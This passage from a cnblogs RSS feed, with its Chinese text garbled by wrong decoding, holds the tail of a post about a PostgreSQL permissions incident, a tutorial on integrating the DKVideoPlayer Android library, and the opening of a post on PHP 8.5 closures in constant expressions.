<p>ä½è¿ä¸ªé®é¢çèµ·æ¥å°ï¼å¯¼è´çå½±åè¿æ¯æ¯è¾å¤§çï¼ç±äºæä»¬å®ä½è¿ä¸ªé®é¢åä¿®å¤ï¼ç»æ°ä»ç¨æ·å¢å æéï¼æ°ä»éæ°æ¨éï¼è±äºä¸äºæ¶é´ï¼ä¿®å¤æ¶å·²ç»è¿äºæä¸ªç¹å®çæ¶ç¹äºï¼å¯¼è´ææ¹å·²ç»æ²¡ææ¶é´åæ¥è·xxljobäºï¼æä¸ªxxljobä»»å¡ç±äºä¸æ¸¸ç³»ç»çéå¶ï¼è¦æ±å¿é¡»å¨æä¸ªæ¶ç¹ä¹åè·æè¡ï¼ï¼åªè½æ¯è®©ä¸å¡åäºå»éç¥å®¢æ·éæ­ã</p>
<p>é¨é¨çé¢å¯¼ä¹ä»å¥äºè¿ä¸ªäºæï¼ä¸å¨å°±å¾ç³»ç»æ¢³çä¸ç°ç¶ï¼åççææ²¡æå¨è¿ç§å¼å¸¸æåµä¸è¿è¡è¡¥æçæªæ½ï¼å½ç¶ï¼æä»¬è¿è¾¹å¶å®æ¯å¯ä»¥è¡¥æçï¼æ°ä»éæ°æ¨éæ°æ®åï¼ææ¹ä¹éæ°æ§è¡xxljobç¸å³ä»»å¡ï¼ï¼ä½æ¯æä»¬ç³»ç»è¿æä¸æ¸¸ï¼ç°å¨å°±æ¯ä¸æ¸¸ç³»ç»ä¸æ¯æè¿äºæä¸ªæ¶é´ç¹åè¿è¡è¡¥æï¼ï¼è¿åè¿å¾åççæä¹å¼ã</p>
<h2 id="æ»ç»-1">æ»ç»</h2>
<p>å°å°çé®é¢ï¼å¤§å¤§çå½±åï¼åºäºé®é¢åæ¥å¤çï¼ä¸è¬ææ¬æ¯æé«çï¼ä¹ä¼å¸¦æ¥æ´å¤çå·¥ä½ï¼å¦äºææ±æ¥ãéå¯¹äºæçæ¹è¿æªæ½ç­ãè¿æ¯å¾é²æ£äºæªç¶ï¼æ²»æªçã</p>
<p>å½ç¶ï¼æç®åçäºä¸ï¼å¸æpostgresqlå¯ä»¥åå°ï¼æ°å¢çåºåï¼ä¸ç¨æ¯æ¬¡åç¬ææï¼èæ¯å¨æ°æ®åºçº§å«è¿è¡ææã</p>
<p><img src="https://dump-1252523945.cos.ap-shanghai.myqcloud.com/img/image-20260117122000029.png" alt="image-20260117122000029" loading="lazy"></p>
<p>ä¸å¨åç ç©¶ä¸å§ï¼ådbaæ²éä¸ï¼é¿åç°å¨æéç®¡çå¤ªç»å¯¼è´çé®é¢ã</p>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-01-17 12:24">2026-01-17 12:23</span>&nbsp;
<a href="https://www.cnblogs.com/grey-wolf">ä¸å½æ¢¦å</a>&nbsp;
éè¯»(<span id="post_view_count">140</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19495709);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19495709', targetLink: 'https://www.cnblogs.com/grey-wolf/p/19495709', title: 'æè¿éå°çä¸¤ä¸ªææ¯é®é¢è®°å½' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ FFmpegå¼åç¬è®°ï¼ä¹åä¹ï¼åºäºKotlinçå½äº§å¼æºæ­æ¾å¨DKVideoPlayer ]]></title>
    <link>https://www.cnblogs.com/aqi00/p/19379646</link>
    <guid>8700b6f42fc0d52d887f15c935f4ebab</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/aqi00/p/19379646" title="åå¸äº 2026-01-17 12:15">
    <span role="heading" aria-level="2">FFmpegå¼åç¬è®°ï¼ä¹åä¹ï¼åºäºKotlinçå½äº§å¼æºæ­æ¾å¨DKVideoPlayer</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body blogpost-body-html">
<span id="cke_bm_197S">å¨Androidå¹³å°ä¸ï¼åºäºFFmpegçå½äº§æ­æ¾å¨å¼æºæ¡æ¶ä¹æå¾å¤äºï¼åæåå©åå©çijkplayerï¼åæå°çº¢ä¹¦çRedPlayerï¼åè§ä¹åçæç« ãä½¿ç¨å½äº§çijkplayeræ­æ¾å¨è§çç½ç»è§é¢ãåãä½¿ç¨å½äº§çRedPlayeræ­æ¾å¨è§çç½ç»è§é¢ãã</span>
<p><span id="cke_bm_197S"> é¤æ­¤ä»¥å¤ï¼DKVideoPlayerä¹æ¯ä¸æ¬¾ä¼ç§çå½äº§Androidè§é¢æ­æ¾å¨ï¼å®åºäºKotlinç¼åï¼ä¸ä½éæäºAndroidåççMediaPlayerï¼è¿éæäºJetpackçExoPlayerï¼çè³éæäºå½äº§çijkplayerãDKVideoPlayeræ¢æ¯ææ­æ¾æ¬å°è§é¢ï¼ä¹æ¯ææ­æ¾ç½ç»è§é¢ï¼çè³æ¯ææ­æ¾ç´æ­é¾æ¥ï¼å¯è°åè½å¼ºå¤§ã<br>
DKVideoPlayerçæºç æç®¡å°åä¸ºhttps://github.com/Doikki/DKVideoPlayerï¼æææ°5.3kï¼ï¼å½åçéåå°åä¸ºhttps://gitcode.com/gh_mirrors/dk/DKVideoPlayerï¼ææ°çæ¬æ¯2022å¹´7æåå¸çv3.3.7ï¼å¯è§è¯¥æ¡æ¶çæºç æ´æ°åååæ¶ï¼è¯¥çæ¬çæºç ä¸è½½å°åä¸ºhttps://github.com/Doikki/DKVideoPlayer/archive/refs/tags/3.3.7.tar.gzã<br>
DKVideoPlayeræä¾äºä¸¤ç§éææ¹å¼ï¼å¼ç¨å¨çº¿åºãç´æ¥å¯¼å¥æºç ï¼åå«è¯´æå¦ä¸ï¼</span></p>
<h1>ä¸ãå¼ç¨DKVideoPlayerå¨çº¿åº</h1>
<p>Androidå·¥ç¨å¼ç¨DKVideoPlayerå¨çº¿åºæ¶ï¼éè¦ä¿®æ¹ä»¥ä¸ä¸¤ä¸ªéç½®ï¼<br>
1ãæå¼æ¨¡åçº§å«çbuild.gradleï¼ç»dependenciesèç¹è¡¥åä¸é¢å è¡éç½®ï¼è¡¨ç¤ºå¼å¥3.3.7çæ¬çDKVideoPlayeråºï¼</p>
<div class="cke_widget_wrapper cke_widget_block cke_widget_codeSnippet cke_widget_selected" data-cke-display-name="ä»£ç æ®µ" data-cke-filter="off" data-cke-widget-id="7" data-cke-widget-wrapper="1">
<pre class="cke_widget_element" data-cke-widget-data="%7B%22code%22%3A%22%23%20%E5%BF%85%E9%80%89%EF%BC%8C%E5%86%85%E9%83%A8%E9%BB%98%E8%AE%A4%E4%BD%BF%E7%94%A8%E7%B3%BB%E7%BB%9Fmediaplayer%E8%BF%9B%E8%A1%8C%E8%A7%A3%E7%A0%81%5Cnimplementation%20'xyz.doikki.android.dkplayer%3Adkplayer-java%3A3.3.7'%5Cn%23%20%E5%8F%AF%E9%80%89%EF%BC%8C%E5%8C%85%E5%90%ABStandardVideoController%E7%9A%84%E5%AE%9E%E7%8E%B0%5Cnimplementation%20'xyz.doikki.android.dkplayer%3Adkplayer-ui%3A3.3.7'%5Cn%23%20%E5%8F%AF%E9%80%89%EF%BC%8C%E4%BD%BF%E7%94%A8exoplayer%E8%BF%9B%E8%A1%8C%E8%A7%A3%E7%A0%81%5Cnimplementation%20'xyz.doikki.android.dkplayer%3Aplayer-exo%3A3.3.7'%5Cn%23%20%E5%8F%AF%E9%80%89%EF%BC%8C%E4%BD%BF%E7%94%A8ijkplayer%E8%BF%9B%E8%A1%8C%E8%A7%A3%E7%A0%81%5Cnimplementation%20'xyz.doikki.android.dkplayer%3Aplayer-ijk%3A3.3.7'%5Cn%23%20%E5%8F%AF%E9%80%89%EF%BC%8C%E5%A6%82%E9%9C%80%E8%A6%81%E7%BC%93%E5%AD%98%E6%88%96%E8%80%85%E6%8A%96%E9%9F%B3%E9%A2%84%E5%8A%A0%E8%BD%BD%E5%8A%9F%E8%83%BD%E8%AF%B7%E5%BC%95%E5%85%A5%E6%AD%A4%E5%BA%93%5Cnimplementation%20'xyz.doikki.android.dkplayer%3Avideocache%3A3.3.7'%22%2C%22classes%22%3Anull%7D" data-cke-widget-keep-attr="0" data-cke-widget-upcasted="1" data-widget="codeSnippet"><code class="hljs"># å¿éï¼åé¨é»è®¤ä½¿ç¨ç³»ç»mediaplayerè¿è¡è§£ç 
implementation 'xyz.doikki.android.dkplayer:dkplayer-java:3.3.7'
# å¯éï¼åå«StandardVideoControllerçå®ç°
implementation 'xyz.doikki.android.dkplayer:dkplayer-ui:3.3.7'
# å¯éï¼ä½¿ç¨exoplayerè¿è¡è§£ç 
implementation 'xyz.doikki.android.dkplayer:player-exo:3.3.7'
# å¯éï¼ä½¿ç¨ijkplayerè¿è¡è§£ç 
implementation 'xyz.doikki.android.dkplayer:player-ijk:3.3.7'
# å¯éï¼å¦éè¦ç¼å­æèæé³é¢å è½½åè½è¯·å¼å¥æ­¤åº
implementation 'xyz.doikki.android.dkplayer:videocache:3.3.7'</code></pre>
</div>
<p>2ãæå¼Appæ¨¡åçsrc/main/AndroidManifest.xmlï¼ç»manifestèç¹è¡¥åä¸é¢å è¡æééç½®ï¼è¡¨ç¤ºå£°ææ¬æµ®çªãå­å¨ç©ºé´åç½ç»ç­æéï¼</p>
<div class="cke_widget_wrapper cke_widget_block cke_widget_codeSnippet cke_widget_selected" data-cke-display-name="ä»£ç æ®µ" data-cke-filter="off" data-cke-widget-id="6" data-cke-widget-wrapper="1">
<pre class="cke_widget_element" data-cke-widget-data="%7B%22code%22%3A%22%3Cuses-permission%20android%3Aname%3D%5C%22android.permission.SYSTEM_ALERT_WINDOW%5C%22%20%2F%3E%5Cn%3Cuses-permission%20android%3Aname%3D%5C%22android.permission.SYSTEM_OVERLAY_WINDOW%5C%22%20%2F%3E%5Cn%3Cuses-permission%20android%3Aname%3D%5C%22android.permission.WRITE_EXTERNAL_STORAGE%5C%22%20%2F%3E%5Cn%3Cuses-permission%20android%3Aname%3D%5C%22android.permission.INTERNET%5C%22%20%2F%3E%5Cn%3Cuses-permission%20android%3Aname%3D%5C%22android.permission.ACCESS_NETWORK_STATE%5C%22%2F%3E%22%2C%22classes%22%3Anull%7D" data-cke-widget-keep-attr="0" data-cke-widget-upcasted="1" data-widget="codeSnippet"><code class="hljs">&lt;uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" /&gt;
&lt;uses-permission android:name="android.permission.SYSTEM_OVERLAY_WINDOW" /&gt;
&lt;uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" /&gt;
&lt;uses-permission android:name="android.permission.INTERNET" /&gt;
&lt;uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/&gt;</code></pre>
</div>
<h1>äºãç´æ¥å¯¼å¥DKVideoPlayeræºç </h1>
<p>DKVideoPlayerçæºç å·²ç»ééAndroid Studio Dolphinï¼å°æµ·è±çæ¬ï¼ï¼ä»éå¨é¡¹ç®çº§å«çbuild.gradleè¡¥åå½åä»åºå³å¯ãä¹å°±æ¯å¨repositoriesèç¹åé¨è¡¥åä»¥ä¸éç½®ï¼</p>
<div class="cke_widget_wrapper cke_widget_block cke_widget_codeSnippet cke_widget_selected" data-cke-display-name="ä»£ç æ®µ" data-cke-filter="off" data-cke-widget-id="5" data-cke-widget-wrapper="1">
<pre class="cke_widget_element" data-cke-widget-data="%7B%22code%22%3A%22%2F%2F%20%E4%BB%A5%E4%B8%8B%E5%9B%9B%E8%A1%8C%E6%B7%BB%E5%8A%A0%E9%98%BF%E9%87%8C%E4%BA%91%E7%9A%84%E4%BB%93%E5%BA%93%E5%9C%B0%E5%9D%80%EF%BC%8C%E6%96%B9%E4%BE%BF%E5%9B%BD%E5%86%85%E5%BC%80%E5%8F%91%E8%80%85%E4%B8%8B%E8%BD%BD%E7%9B%B8%E5%85%B3%E6%8F%92%E4%BB%B6%5Cnmaven%20%7B%20url%20%3D%20uri(%5C%22https%3A%2F%2Fmaven.aliyun.com%2Frepository%2Fjcenter%5C%22)%20%7D%5Cnmaven%20%7B%20url%20%3D%20uri(%5C%22https%3A%2F%2Fmaven.aliyun.com%2Frepository%2Fgoogle%5C%22)%7D%5Cnmaven%20%7B%20url%20%3D%20uri(%5C%22https%3A%2F%2Fmaven.aliyun.com%2Frepository%2Fgradle-plugin%5C%22)%7D%5Cnmaven%20%7B%20url%20%3D%20uri(%5C%22https%3A%2F%2Fmaven.aliyun.com%2Frepository%2Fpublic%5C%22)%7D%5Cn%2F%2F%20%E4%BB%A5%E4%B8%8B%E6%B7%BB%E5%8A%A0%E6%B8%85%E5%8D%8E%E5%A4%A7%E5%AD%A6%E7%9A%84%E4%BB%93%E5%BA%93%E5%9C%B0%E5%9D%80%5Cnmaven%20%7B%20url%20%3D%20uri(%5C%22https%3A%2F%2Fmirrors.tuna.tsinghua.edu.cn%2Frepository%2Fmaven-central%2F%5C%22)%20%7D%22%2C%22classes%22%3Anull%7D" data-cke-widget-keep-attr="0" data-cke-widget-upcasted="1" data-widget="codeSnippet"><code class="hljs">// ä»¥ä¸åè¡æ·»å é¿éäºçä»åºå°åï¼æ¹ä¾¿å½åå¼åèä¸è½½ç¸å³æä»¶
maven { url = uri("https://maven.aliyun.com/repository/jcenter") }
maven { url = uri("https://maven.aliyun.com/repository/google")}
maven { url = uri("https://maven.aliyun.com/repository/gradle-plugin")}
maven { url = uri("https://maven.aliyun.com/repository/public")}
// ä»¥ä¸æ·»å æ¸åå¤§å­¦çä»åºå°å
maven { url = uri("https://mirrors.tuna.tsinghua.edu.cn/repository/maven-central/") }</code></pre>
</div>
<p>å¢å ä»¥ä¸éç½®çç®çæ¯å¼å¥å½åçä»åºå°åï¼ä»¥ä¾¿å å¿«ç¸å³ä¾èµåçä¸è½½éåº¦ã</p>
<p>ç­å¾DKVideoPlayerå·¥ç¨ç¼è¯éè¿ï¼æä¸»å¥å£çdkplayer-sampleæ¨¡åå®è£å°ææºä¸ï¼å¯å¨ä¹åçAppçé¢å¦ä¸å¾æç¤ºï¼</p>
<p><span class="cke_widget_wrapper cke_widget_inline cke_widget_image cke_image_nocaption cke_widget_selected" data-cke-display-name="å¾å" data-cke-filter="off" data-cke-widget-id="4" data-cke-widget-wrapper="1"><span class="cke_reset cke_widget_drag_handler_container"><span class="cke_image_resizer" title="ç¹å»å¹¶ææ½ä»¥æ¹åå°ºå¯¸"><span class="cke_widget_edit_container" title="ç¼è¾å¾ç"><img alt="dkplayer1" width="410" height="468" loading="lazy" data-src="https://img2024.cnblogs.com/blog/729938/202512/729938-20251221180441777-124194375.jpg" class="lazyload"></span></span></span></span></p>
<p>ç¹å»ãç¹æ­ãæé®ï¼æå¼ç½ç»è§é¢çæ­æ¾çé¢å¦ä¸å¾æç¤ºï¼</p>
<p><span class="cke_widget_wrapper cke_widget_inline cke_widget_image cke_image_nocaption cke_widget_selected" data-cke-display-name="å¾å" data-cke-filter="off" data-cke-widget-id="3" data-cke-widget-wrapper="1"><span class="cke_reset cke_widget_drag_handler_container"><span class="cke_image_resizer" title="ç¹å»å¹¶ææ½ä»¥æ¹åå°ºå¯¸"><span class="cke_widget_edit_container" title="ç¼è¾å¾ç"><img alt="dkplayer2" width="403" height="609" loading="lazy" data-src="https://img2024.cnblogs.com/blog/729938/202512/729938-20251221180456662-462668323.jpg" class="lazyload"></span></span></span></span></p>
<p>æèç¹å»ãç´æ­ãæé®ï¼æå¼ç´æ­é¾æ¥çæ­æ¾çé¢å¦ä¸å¾æç¤ºï¼</p>
<p><span class="cke_widget_wrapper cke_widget_inline cke_widget_image cke_image_nocaption cke_widget_selected" data-cke-display-name="å¾å" data-cke-filter="off" data-cke-widget-id="2" data-cke-widget-wrapper="1"><span class="cke_reset cke_widget_drag_handler_container"><span class="cke_image_resizer" title="ç¹å»å¹¶ææ½ä»¥æ¹åå°ºå¯¸"><span class="cke_widget_edit_container" title="ç¼è¾å¾ç"><img alt="dkplayer3" width="403" height="608" loading="lazy" data-src="https://img2024.cnblogs.com/blog/729938/202512/729938-20251221180522634-502106673.jpg" class="lazyload"></span></span></span></span></p>
<p>å¯è§DKVideoPlayeræ¯æè°æ´æ­æ¾çªå£å¤§å°ãè°æ´æ­æ¾éåº¦ï¼ä»¥åæè½¬ãæªå¾ãè£åªç­åè½ï¼å¯è°å°å¸¸è§çæ­æ¾æä½ä¸ç½æå°½ã</p>
<p>æ´å¤è¯¦ç»çFFmpegå¼åç¥è¯åè§<span class="cke_widget_wrapper cke_widget_inline cke_widget_csdnlink cke_widget_selected" data-cke-display-name="a" data-cke-filter="off" data-cke-widget-id="1" data-cke-widget-wrapper="1"><a class="cke_widget_editable cke_widget_element" title="ãFFmpegå¼åå®æï¼ä»é¶åºç¡å°ç­è§é¢ä¸çº¿ã" href="https://item.jd.com/14020415.html" data-cke-enter-mode="2" data-cke-saved-href="https://item.jd.com/14020415.html" data-cke-widget-data="%7B%22url%22%3A%22https%3A%2F%2Fitem.jd.com%2F14020415.html%22%2C%22text%22%3A%22%E3%80%8AFFmpeg%E5%BC%80%E5%8F%91%E5%AE%9E%E6%88%98%EF%BC%9A%E4%BB%8E%E9%9B%B6%E5%9F%BA%E7%A1%80%E5%88%B0%E7%9F%AD%E8%A7%86%E9%A2%91%E4%B8%8A%E7%BA%BF%E3%80%8B%22%2C%22desc%22%3A%22%22%2C%22icon%22%3A%22%22%2C%22isCard%22%3Afalse%2C%22hasResquest%22%3Atrue%2C%22iconDefault%22%3A%22https%3A%2F%2Fcsdnimg.cn%2Frelease%2Fblog_editor_html%2Frelease2.4.4%2Fckeditor%2Fplugins%2FCsdnLink%2Ficons%2Ficon-default.png%3Ft%3DP9T8%22%2C%22id%22%3A%22iCdS73-1766311368387%22%2C%22classes%22%3Anull%7D" data-cke-widget-editable="text" data-cke-widget-keep-attr="0" data-cke-widget-upcasted="1" data-link-icon="https://csdnimg.cn/release/blog_editor_html/release2.4.4/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=P9T8" data-link-title="ãFFmpegå¼åå®æï¼ä»é¶åºç¡å°ç­è§é¢ä¸çº¿ã" data-widget="csdnlink" rel="noopener nofollow">ãFFmpegå¼åå®æï¼ä»é¶åºç¡å°ç­è§é¢ä¸çº¿ã</a>ä¸ä¹¦ã</span></p>
</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-01-17 12:16">2026-01-17 12:15</span>&nbsp;
<a href="https://www.cnblogs.com/aqi00">aqi00</a>&nbsp;
éè¯»(<span id="post_view_count">97</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19379646);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19379646', targetLink: 'https://www.cnblogs.com/aqi00/p/19379646', title: 'FFmpegå¼åç¬è®°ï¼ä¹åä¹ï¼åºäºKotlinçå½äº§å¼æºæ­æ¾å¨DKVideoPlayer' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ PHP 8.5 é­ååä¸ç­å¯è°ç¨å¯¹è±¡è¿å¥å¸¸éè¡¨è¾¾å¼ ]]></title>
    <link>https://www.cnblogs.com/catchadmin/p/19494966</link>
    <guid>962b83ae5f21dc695a162ffdf21a0698</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/catchadmin/p/19494966" title="åå¸äº 2026-01-17 08:09">
    <span role="heading" aria-level="2">PHP 8.5 é­ååä¸ç­å¯è°ç¨å¯¹è±¡è¿å¥å¸¸éè¡¨è¾¾å¼</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h1 id="php-85-é­ååä¸ç­å¯è°ç¨å¯¹è±¡è¿å¥å¸¸éè¡¨è¾¾å¼">PHP 8.5 é­ååä¸ç­å¯è°ç¨å¯¹è±¡è¿å¥å¸¸éè¡¨è¾¾å¼</h1>
<h2 id="å½éç½®åæè¿è¡æ¶è¶æ°´ä»£ç ">å½"éç½®"åæè¿è¡æ¶è¶æ°´ä»£ç </h2>
<p>PHP éç½®ä¸ç´æä¸ªçç¾ï¼</p>
<ul>
<li>ä½ æ³è¦å£°æå¼éç½®ï¼ç®åçæ°ç»ãå¸¸éå¼ãå±æ§ã</li>
<li>ä½ä½ ä¹éè¦ä¸ç¹é»è¾ï¼"éªè¯è¿ä¸ªå­æ®µ"ã"éæ©è¿ä¸ªå¤çå¨"ã"æ ¼å¼åè¿ä¸ªå¼"ã"è¿æ»¤è¿ä¸ªåè¡¨"ã</li>
</ul>
<p>ä»¥åï¼ä¸æ¦ä½ éè¦å¨"éç½®ç±»"çå°æ¹å é»è¾ï¼å°±ä¼ç¢°å£ãPHP æææå¾å¤ç»æéå¶å¨å¸¸éè¡¨è¾¾å¼ââåºæ¬ä¸å°±æ¯ä¸å¯åçå¼ãå±æ§åæ°æ¯æææ¾çä¾å­ï¼ä½ å¯ä»¥æ¾æ´æ°ãå­ç¬¦ä¸²ãæ éæ°ç»â¦â¦ä½ä¸è½æ¾é­åã</p>
<p>æä»¥æä»¬ç¨åç§åéæ¹æ¡ï¼</p>
<ul>
<li>å­å­ç¬¦ä¸²å¦ <code>"App\\Handler::handle"</code>ï¼ç¶åç¨ <code>call_user_func</code> è°ç¨ã</li>
<li>å¨å±æ§éç¨"è¿·ä½ è¯­è¨"ï¼æ¯å¦è¡¨è¾¾å¼å­ç¬¦ä¸²ã</li>
<li>ç¨å¯ç©ºåè°ï¼å¨è¿è¡æ¶è®¾ç½®é»è®¤å¼ã</li>
<li>å¨å¼å¯¼æä»¶éå»ºæ³¨åè¡¨ï¼èä¸æ¯ç´æ¥å¨è¯¥æ¾çå°æ¹è¡¨è¾¾ã</li>
</ul>
<p>PHP 8.5 æ¹åäºè¿ä¸ªå±é¢ï¼éæé­ååä¸ç­å¯è°ç¨å¯¹è±¡ç°å¨å¯ä»¥åºç°å¨å¸¸éè¡¨è¾¾å¼ä¸­ï¼åæ¬ï¼</p>
<ul>
<li>å±æ§åæ°</li>
<li>å±æ§ååæ°çé»è®¤å¼</li>
<li>å¸¸éåç±»å¸¸é</li>
</ul>
<p>è¿å¬èµ·æ¥åç¼è¯å¨ç¹æ§ãå®éä¸æ¯ä¸ª"çæ´»è´¨é"åçº§ï¼è®©ä½ æéç½®æ¾å¨å®éç½®çä»£ç æè¾¹ï¼ä¸ç¨é­æ¯å­ç¬¦ä¸²æè¿è¡æ¶åå§å hackã</p>
<p>è¿ç¯æç« ä¼è®²"ä¸ºä»ä¹"ãå·ä½è§åï¼æéè¦éå¶ï¼ï¼ç¶åæ·±å¥å®éæ¨¡å¼ï¼è·¯ç±æ å°ãå¤çå¨æ³¨åè¡¨ãç­ç¥/æ ¼å¼åå¨æ³¨åè¡¨ãä¹ä¼è®²åªäºåºæ¯ä¸éåââå ä¸ºå¦æä¸å°å¿ï¼å¯è°ç¨éç½®ç¡®å®è½æåºä¸å¢ä¹±ã</p>
<p><a href="https://catchadmin.com/post/2026-01/php85-closures-callables-constant-expressions" target="_blank" rel="noopener nofollow">åæ PHP 8.5 é­ååä¸ç­å¯è°ç¨å¯¹è±¡è¿å¥å¸¸éè¡¨è¾¾å¼</a></p>
<h2 id="æ§çç¹å¸¸éå¤ªåéé»è¾åªè½å¡è¿è¿è¡æ¶åå§å">æ§çç¹ï¼å¸¸éå¤ªåéï¼é»è¾åªè½å¡è¿è¿è¡æ¶åå§å</h2>
<p>PHP 8.5 ä¹åï¼éå¶ä¸æ¯ä½ ä¸è½åå»ºé­åââèæ¯ä½ ä¸è½å¨æäº"éç½®æ§½"éç¨å®ä»¬ã</p>
<p>ä¸ä¸ªå¸¸è§çç¹ï¼</p>
<h3 id="çç¹-aåè°é»è®¤å¼åæ°å¼ºå¶è¿è¡æ¶åå§å">çç¹ Aï¼"åè°é»è®¤å¼"åæ°å¼ºå¶è¿è¡æ¶åå§å</h3>
<p>å¦æä½ æ³åä¸ä¸ªæ¥åå¯éåè°çå½æ°ï¼å¹¶ä¸æ³è¦ä¸ä¸ªåççé»è®¤åè°ï¼éå¸¸è¿æ ·åï¼</p>
<pre><code class="language-php">function my_filter(array $items, ?Closure $predicate = null): array
{
    $predicate ??= static function ($v): bool { return !empty($v); };
    $out = [];
    foreach ($items as $item) {
        if ($predicate($item)) {
            $out[] = $item;
        }
    }
    return $out;
}
</code></pre>
<p>è¿è½ç¨â¦â¦ä½æ¯æ ·æ¿ä»£ç ï¼èä¸ä¸æ¯"å£°æå¼"çã</p>
<p>PHP 8.5 ç RFC æç¡®æå°è¿ä¸ªç¨ä¾ï¼åè®¸ç´æ¥å£°æé»è®¤åè°é­åï¼ä¸ç¨å¯ç©ºåæ°çåéæ¹æ¡ã</p>
<h3 id="çç¹-bå±æ§åæ°ä¸è½åå«çæ­£çé»è¾">çç¹ Bï¼å±æ§åæ°ä¸è½åå«çæ­£çé»è¾</h3>
<p>å±æ§æ¯è¡¨è¾¾è§åçèªç¶åºæï¼</p>
<ul>
<li>æææ£æ¥</li>
<li>éªè¯</li>
<li>åºååè¡ä¸º</li>
<li>æµè¯ç¨ä¾çæ</li>
</ul>
<p>ä½å±æ§åæ°åªè½æ¯å¸¸éè¡¨è¾¾å¼ï¼æä»¥äººä»¬ç¨å­ç¬¦ä¸²æè¡¨è¾¾å¼å¯¹è±¡ã</p>
<p>PHP 8.5 åå¸å¬åå±ç¤ºäºä¸ä¸ªå¸åç"ä¹å"æ¨¡å¼ï¼è®¿é®æ§å¶å±æ§æ¥åå­ç¬¦ä¸²è¡¨è¾¾å¼ãå¨ PHP 8.5 ä¸­ä½ å¯ä»¥ç´æ¥ä¼ éæé­åã</p>
<h3 id="çç¹-cæ³¨åè¡¨åè·¯ç±æ å°åæè¿è¡æ¶å¼å¯¼">çç¹ Cï¼æ³¨åè¡¨åè·¯ç±æ å°åæè¿è¡æ¶å¼å¯¼</h3>
<p>ä»»ä½æ¶åä½ æ³è¦ä»"é®"å°"å¤çå¨"çæ å°ï¼ä½ å¯è½å¨è¿è¡æ¶æå»ºå®ï¼</p>
<pre><code class="language-php">$handlers = [
    'json' =&gt; [JsonFormatter::class, 'format'],
    'text' =&gt; [TextFormatter::class, 'format'],
];
</code></pre>
<p>è¿è½ç¨ï¼ä½å¾èå¼±ï¼</p>
<ul>
<li>IDE éå½åéæä¸è½å¯é å°è·è¸ªå­ç¬¦ä¸²æ¹æ³åã</li>
<li>éæåææ´é¾çè§£ä»ä¹æ¯å¯è°ç¨çã</li>
<li>ä½ éè¦è¿è¡æ¶ä»£ç æ¥ç»è£æ¦å¿µä¸æ¯éæéç½®çä¸è¥¿ã</li>
</ul>
<p>PHP 8.5 çå¸¸éè¡¨è¾¾å¼æ¹è¿è®©ä½ å¯ä»¥æè¿äºæ³¨åè¡¨è¡¨è¾¾ä¸ºå¸¸éââå¹¶ä¸è®©å¤çå¨éæå®å¨ã</p>
<h2 id="ä»ä¹æ¯å¸¸éè¡¨è¾¾å¼ä¸ºä»ä¹éè¦">ä»ä¹æ¯å¸¸éè¡¨è¾¾å¼ï¼ä¸ºä»ä¹éè¦</h2>
<p>"å¸¸éè¡¨è¾¾å¼"æ¯ PHP åé¨æ¯è¯­ï¼æå¨å¿é¡»ä¸ä¾èµè¿è¡æ¶ç¶æå°±è½è®¡ç®çä¸ä¸æä¸­åè®¸çè¡¨è¾¾å¼ââå¯ä»¥çè§£ä¸º"ä¸å¯åå¼"ã</p>
<p>è¿äºä¸ä¸æåæ¬ï¼</p>
<ul>
<li>å±æ§åæ°</li>
<li>åæ°åå±æ§çé»è®¤å¼</li>
<li>ï¼ç±»ï¼å¸¸é</li>
</ul>
<p>é­å RFC æ»ç»æ§è§åä¸ºï¼å¸¸éè¡¨è¾¾å¼è¢«éå¶å¨å®éä¸æ¯"ä¸å¯åå¼"çæä½ï¼é­åä¸åæ¬å¨åââå°½ç®¡é­åæ¬è´¨ä¸æ¯ç¼è¯åçä»£ç ï¼æä½ç ï¼ï¼å¨çº¦æä¸å¯ä»¥è¢«è§ä¸ºä¸å¯åã</p>
<p>ä¸ºä»ä¹è¿å¾éè¦ï¼</p>
<p>å ä¸ºè¿äºä¸ä¸ææ¯ä½ æ³æ¾éç½®çå°æ¹ï¼</p>
<ul>
<li>å±æ§æ¯ä½ çåæ°æ®/éç½®å±ã</li>
<li>é»è®¤åæ°/å±æ§å¼è¡¨è¾¾é¢æè¡ä¸ºï¼ä¸éè¦æ ·æ¿ä»£ç ã</li>
<li>å¸¸éè¡¨è¾¾"è¿ä¸ªæ å°ä¸ä¼å"ã</li>
</ul>
<p>æ¢å¥è¯è¯´ï¼å¸¸éè¡¨è¾¾å¼æ¯ PHP å¼å¯¼ä½ èµ°åå£°æå¼ä»£ç çå°æ¹ãPHP 8.5 æ©å±äº"å£°æå¼"çå«ä¹ã</p>
<h2 id="å¸¸éä¸­çé­åå®å¨å¯è¯»çæ¨¡å¼åç¡¬æ§è§å">å¸¸éä¸­çé­åï¼å®å¨å¯è¯»çæ¨¡å¼ï¼åç¡¬æ§è§åï¼</h2>
<p>PHP 8.5 åè®¸å¸¸éè¡¨è¾¾å¼ä¸­çé­åââä½æä¸¥æ ¼çº¦æï¼</p>
<ul>
